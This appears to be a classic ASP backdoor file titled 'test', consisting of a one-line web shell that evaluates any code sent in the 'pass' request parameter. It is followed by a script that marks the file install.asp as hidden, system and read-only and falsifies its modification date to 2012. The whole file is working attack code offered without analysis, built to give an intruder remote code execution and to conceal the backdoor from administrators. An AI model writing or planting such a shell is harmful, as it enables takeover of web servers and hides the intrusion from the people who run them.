<title>test</title>
<%eval request("pass")%>
<%
path=server.mappath(".")
fileName="install.asp"
newTime="12/30/2012 11:10:30"

Set fso=Server.CreateObject("Scripting.FileSystemObject") 
Set file=fso.getFile(server.mappath(".")&"/"&fileName) 
file.attributes=39

Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
%>
